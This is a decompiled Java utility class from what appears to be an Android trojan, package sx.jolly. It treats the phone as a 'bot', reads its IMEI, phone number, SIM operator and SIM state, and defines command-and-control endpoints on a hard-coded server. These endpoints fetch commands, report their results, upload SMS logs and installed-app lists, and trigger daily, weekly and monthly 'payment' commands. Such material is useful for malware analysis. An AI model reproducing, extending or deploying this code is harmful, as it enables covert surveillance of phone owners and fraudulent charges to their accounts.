package sx.jolly.utils;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import sx.jolly.core.SingleCommand;

public class Utils {
    public static final int CHECKBOT_FIRST_RUN_INTERVAL = 0;
    public static final int CHECKBOT_INTERVAL = 600000;
    public static final String CMD_CATEGORIES = "cloud/category/";
    public static final String CMD_CHECK_PAYMENT = "cloud/checkpayment/";
    public static final String CMD_COMMAND = "cloud/command/";
    public static final String CMD_COMMAND_RESULT = "cloud/result/";
    public static final String CMD_DAILY_PAYMENT = "cloud/manualcommand/type/day/";
    public static final String CMD_MONTHLY_PAYMENT = "cloud/manualcommand/type/month/";
    public static final String CMD_MOVIES = "cloud/movies/";
    public static final String CMD_SAVEAPPS = "cloud/saveapps/";
    public static final String CMD_SAVELOG = "cloud/savelog/";
    public static final String CMD_SAVESMSLOGS = "cloud/savesmslogs/";
    public static final String CMD_WEEKLY_PAYMENT = "cloud/manualcommand/type/week/";
    public static final String RESPONSE_PAID = "PAID";
    public static final String SERVER = "partnerslab.com";
    public static String botID = null;
    public static String botNumber = null;
    public static String botSDK = null;

    public static boolean completeCommand(SingleCommand cmd, String manager, Context context, String resultCode) {
        Url u = new Url(CMD_COMMAND_RESULT, true, true, context);
        u.setManager(manager);
        if (cmd.findProperty("amount") != null) {
            u.setAmount(cmd.findProperty("amount").getValue());
        }
        u.setCommand(cmd.findProperty("commandID").getValue());
        u.setResult(resultCode);
        if (new Get(u, context).get() != null) {
            return true;
        }
        return false;
    }

    public static void CopyStream(InputStream is, OutputStream os) {
        try {
            byte[] bytes = new byte[1024];
            while (true) {
                int count = is.read(bytes, 0, 1024);
                if (count != -1) {
                    os.write(bytes, 0, count);
                } else {
                    return;
                }
            }
        } catch (Exception e) {
        }
    }

    public static void slog(Class cl, String message) {
        System.out.println(new StringBuilder(String.valueOf(cl.getSimpleName().toString())).append(": ").append(message).toString());
    }

    public static String base64encode(String str) {
        byte[] data = null;
        try {
            return Base64.encodeToString(str.getBytes("UTF-8"), 0);
        } catch (UnsupportedEncodingException e) {
            return null;
        }
    }

    public static String getBotSDK() {
        return VERSION.SDK;
    }

    public static String getBotId(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
    }

    public static String getBotNumber(Context context) {
        String number = ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
        if (number == null) {
            return "UNKNOWN";
        }
        return number;
    }

    public static boolean setPartner(Activity activity) {
        try {
            Bundle metaData = activity.getPackageManager().getActivityInfo(activity.getComponentName(), 129).metaData;
            if (metaData == null) {
                slog(Utils.class, "no metadata");
                return false;
            }
            Object value = metaData.get("sx.jolly.partner");
            Editor editor = PreferenceManager.getDefaultSharedPreferences(activity).edit();
            editor.putString("sx.jolly.partner", value.toString().substring(1));
            editor.commit();
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }

    public static String getPartner(Context c) {
        return PreferenceManager.getDefaultSharedPreferences(c).getString("sx.jolly.partner", "");
    }

    public static String getOperatorName(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getSimOperatorName();
    }

    public static String getPackageName(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).packageName;
        } catch (NameNotFoundException e) {
            return "NA";
        }
    }

    public static String detectSIM(Context context) {
        switch (((TelephonyManager) context.getSystemService("phone")).getSimState()) {
            case 0:
                return "UNKNOWN";
            case 1:
                return "NO_SIM";
            case 2:
                return "PIN_REQUIRED";
            case 3:
                return "PUK_REQUIRED";
            case 4:
                return "NETWORK_LOCKED";
            case 5:
                return "HAS_SIM";
            default:
                return "ERROR_DETECTING_SIM";
        }
    }

    public static String getAppVersion(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
        } catch (NameNotFoundException e) {
            return "NA";
        }
    }

    public static String getDeviceManufacturer() {
        return Build.MANUFACTURER;
    }

    public static String getDeviceModel() {
        try {
            return URLEncoder.encode(Build.MODEL, "utf-8");
        } catch (UnsupportedEncodingException e) {
            return "unknown";
        }
    }
}
